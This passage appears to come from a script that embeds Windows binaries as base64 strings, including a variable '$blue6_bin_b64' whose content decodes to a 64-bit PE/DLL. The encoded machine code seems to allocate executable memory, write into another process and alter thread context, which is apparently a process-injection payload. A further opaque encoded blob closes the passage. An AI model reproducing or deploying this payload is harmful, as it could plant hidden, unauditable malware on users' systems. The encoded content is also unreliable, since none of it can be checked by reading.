7GPtM+8j74Pg0/dT+QP60/2D/mPwAgAAAYAQAAJzBVMGIwhzCkMLEwxjDNMNsw7TABMRExKzFPMWExZjFrMYIxjzGdMaIxrzHEMdUx2zHkMQoyHDIiMjoyQDJLMlEyWDJpMnMynTK0Ms4y4TICMxAzMDM5M4gznjOyM8oz0DPWM98z5TMYNB40MTRlNHQ0eTSCNIk0kjS1NNM02TTfNAQ1CjUxNTc1RDVpNYE1jjWYNbM1vTXINc414TXrNQM2CTbNNuE27zb2N
vs2VTdjN3E3ezeCN4g31TfhN+839jcGOCE4Lzg1ODw4hTiROJ04tTjDONE42zjiOOg4NzlROV85ZTlrOaQ5zjkiOio6Mjo6OkI6SjpSOlo6YjpqOnI6ejqCOoo6kjqaOqI6xDoAMAAADAAAAAA4AAAAQAAAEAAAAGgwbDBwMAAAAIAAABAAAAAMMBgwHDAAAACQAAAQAAAABDAIMAwwEDAAsAAAHAAAABAwMDBQMIgwqDDgMAAxIDFwMZAxAMAAAEAAAACfMKw8
yjzfPBQ9aT2TPbc90z31Pf49FD41PlA+Wj5sPro+zT7iPvc+IT9JP2o/hT+XP7c/zT/hPwDQAABkAAAADzBpMG4wdzCAMKMwxjDPMPIwFTE3MUAxYjGEMaYxyDEUMk0yaTKLMroz/zTrOEU5TjliOWs5dDmYOaE5qjm+OeA5/jknOkA6Ujs3P1A/cD+dP6s/uz/KP+g/AAAA4AAAMAAAAOQ0DDU4NWI1Cja+PAM9FD03PW09fT2LPZE9pj3gPf49ID5EPm4+Ij8
A8AAARAAAACYyXzKKMrsy4zIAMzMzYTN1M40zpTO7M88z4zP6MzM0TDRgNIU0qTTNNDo2TjZiNnY2ITf4Oic70TsAAAAAAQBgAAAAlTXBNdM15TUCNi82dDaJNpI2qTbBNtM22TbrNvE2/zZuN483qjf6NyI4aTh+OKk4zTjjOA45MjlIOXM5lzmpObs5wTnPOds5CTogOjE6PzpHOmI6gToLPAAQAQBYAAAAVDBsMIIwkDCeMKQwrjDYMBcxMTE/MUUxTzGCMc
Yx1DHaMegx7jH3MQEyIjJuMocyljKvMroy5DLtMvcy/jIIMyUzRTNlMz80JDVXNfs1AAAAIAEATAAAAJwx0DH7MQkyYDK7MuMy8jIHM1QzjTO1M8gzIjRLNG80mDTyNBY1PDVaNX41sTUBNik2PDagNhY3PjdRN2o3azixOQAAAFABABwAAADpMSQ0PTWAN6g4GzplO0s9lz8AAABgAQAMAAAAkzEAAABwAQBMAAAAHDBIMLQwNDFkMZAxvDHUMfgxHDJ8Mqgyx
DLwMhQzJDNIM2AzpDPoMzQ0ZDSkNPQ0BDUUNTg1oDXQNeA1HDYsNmA2wDYAkAEADAAAAB80nTQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
$blue6_bin_b64='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
Y0A8SInRTCnBSQHAQQ+3UAZBD7dAFIXSSY1EABh0zIPqAUiNFJJMjUzQKA8fgAAAAABEi0AMTDnBTInCcggDUAhIOdFyHEiDwChMOch140UxyUyJyEiDxCjDDx+EAAAAAABJicFMichIg8Qoww8fRAAASIPsKEiLFSUmAAAxwGaBOk1adAxIg8Qoww8fgAAAAABIidHoCP7//4XAdOhIY0I8D7dEEAZIg8Qow2YPH0QAAEiD7ChMiwXlJQAARTHJSInKZkGBOE1
adAhMichIg8Qow0yJwejH/f//hcB07EljQDxJAcBBD7dIBkEPt0AUhclJjUQAGHTSg+kBSI0MiUiNTMgo9kAnIHQJSIXSdCJIg+oBSIPAKEg5yHXoRTHJTInISIPEKMNmLg8fhAAAAAAASYnBTInISIPEKMMPH0QAAEiD7ChMiwVVJQAAMdJmQYE4TVp0C0iJ0EiDxCjDDx8ATInB6Dj9//+FwEkPRdBIidBIg8Qow2YuDx+EAAAAAABIg+woTIsFFSUAADHASI
nKZkGBOE1adAhIg8Qoww8fAEyJwej4/P//hcB07EljQDxIidFMKcFJAcBBD7dQBkEPt0AUhdJJjUQAGHQxg+oBSI0UkkyNTNAoDx+EAAAAAABEi0AMTDnBTInCcggDUAhIOdFyEEiDwChMOch14zHASIPEKMOLQCT30MHoH0iDxCjDDx9EAABmLg8fhAAAAAAASIPsKEyLHXUkAABFMclBichmQYE7TVp0CEyJyEiDxCjDTInZ6Ff8//+FwHTsSWNLPEwB2YuBk
AAAAIXAdNsPt1EUSI1UERgPt0kGhcl0yoPpAUiNDIlMjVTKKA8fRAAARItKDEw5yEyJyXIIA0oISDnIchxIg8IoTDnSdeNFMclMichIg8Qoww8fhAAAAAAATAHYdRPr5mYPH4QAAAAAAEGD6AFIg8AUi0gEhcl1B4tQDIXSdMdFhcB/5USLSAxNAdlMichIg8Qow5CQkJCQkNvjw5CQkJCQkJCQkJCQkJBRUEg9ABAAAEiNTCQYchlIgekAEAAASIMJAEgtABAA
AEg9ABAAAHfnSCnBSIMJAFhZw5CQkJCQkJCQkJCQkJCQuAEAAADDkJCQkJCQkJCQkP8lGnYAAJCQ/yUKdgAAkJD/Jfp1AACQkP8l6nUAAJCQ/yXadQAAkJD/Jcp1AACQkP8lunUAAJCQ/yWqdQAAkJD/JZp1AACQkP8linUAAJCQ/yV6dQAAkJD/JWp1AACQkP8lWnUAAJCQ/yVKdQAAkJD/JTp1AACQkP8lKnUAAJCQ/yUadQAAkJD/JQp1AACQkP8l+nQAAJC
QDx+EAAAAAAD/JYJzAACQkP8lcnMAAJCQ/yVicwAAkJD/JVJzAACQkP8lQnMAAJCQ/yUycwAAkJD/JSJzAACQkA8fhAAAAAAA/yWadAAAkJD/JYp0AACQkP8lenQAAJCQ/yVqdAAAkJD/JVp0AACQkP8lSnQAAJCQ/yU6dAAAkJD/JSp0AACQkP8lGnQAAJCQ/yUKdAAAkJD/JfpzAACQkP8l6nMAAJCQ/yXacwAAkJD/JcpzAACQkP8lunMAAJCQ/yWqcwAAkJ
D/JZpzAACQkP8linMAAJCQ/yV6cwAAkJD/JWpzAACQkP8lWnMAAJCQ/yVKcwAAkJD/JTpzAACQkP8lKnMAAJCQ/yUacwAAkJD/JQpzAACQkP8l+nIAAJCQ/yXqcgAAkJD/JdpyAACQkP8lynIAAJCQ/yW6cgAAkJD/JapyAACQkP8lmnIAAJCQ/yWKcgAAkJD/JXpyAACQkP8lanIAAJCQ/yVacgAAkJD/JUpyAACQkP8lOnIAAJCQ/yUqcgAAkJD/JRpyAACQk
P8lCnIAAJCQ//////////8AAAAAAAAAAP//////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4m5mW+ZH8mfmQnpafl5ebm56Tk5+TkJiQn5OTl5+Q/Z6Ynp6T+JaQ+JKe+Jb4/J6R/J+RkpmQl5P9kZH4k5eXkZmQnpmW/ZK
Sk/2WmZeQlpiSk5ORl5b9mJD5+JaWmZCWn5aZkJv9kJGbkZmbn/mYk5efm/mY/ZaTk5uWmJuSkv34mJmS/Pme/ZiS+JGWmZebnpb9/PyYkvmT+fiSn/j9nvyWkZf5/J+Q+J6bkZD4/Jb9k5efmJmQkpeW/Pn4kv2Wnvz5k5ufmZKT+JeQkZGQkZGWm5aWl5ie/ZGR+ZuWmJuTmZiemZCSlvmRkpKQnv2Tkpn5m56R/Z+Wl/mem56ekfn9l/2ek/mf+f2Yl5mTkZ
KTnp6TmfiWkZaZ/P2RmJ+RkZL5n/ie/JOWkf2Zm5ObkZH8lp6Tmf39/J6YkJuenvj9+ZaYkJKQmZ74mJCR/ZD4+ZKT/J6RmJufl5b4npuWn56Y+fmTmJ+Yn5aRkZ+SmZCRkvn9kZaX+Pz9l/z8kpj4kvz8mZKbkpf9/PyZmZCSm5CZ+Zf8np+Rm56QkfmQk5aRk/n9kJiY/JH4k5Kf/PmflviRnpaQ+J+bmJaY/PyQl5P9l5eQmZuTmJL8mP38/fz4n/yTkJD5k
5+f+ZmTkpf5m5ubkZGWkPn9+fmSm5ORmJKXn/yXkpuWkp+Rlvj9mJj9/fyZ+ZCT+JiZn5v9mPyW+Pz8m5aR+PyS/JGWm5f5m575n5mXn5aW/ZOQk5L5mJ/8l/z9+PiXmZL4lpeQnviekPiZkJ+SnpCRkZmWlp75k5+Q+JeRkf2X/PyYn5v9m5GW/Zn4mZCQl/2b+ZmQk5eRkZj4+ZOX+ZaZlvyX+JCfkvz4/ZKRm/mY/JH8mP2emf2ZnpObk/iR+JKZmZCblvn9
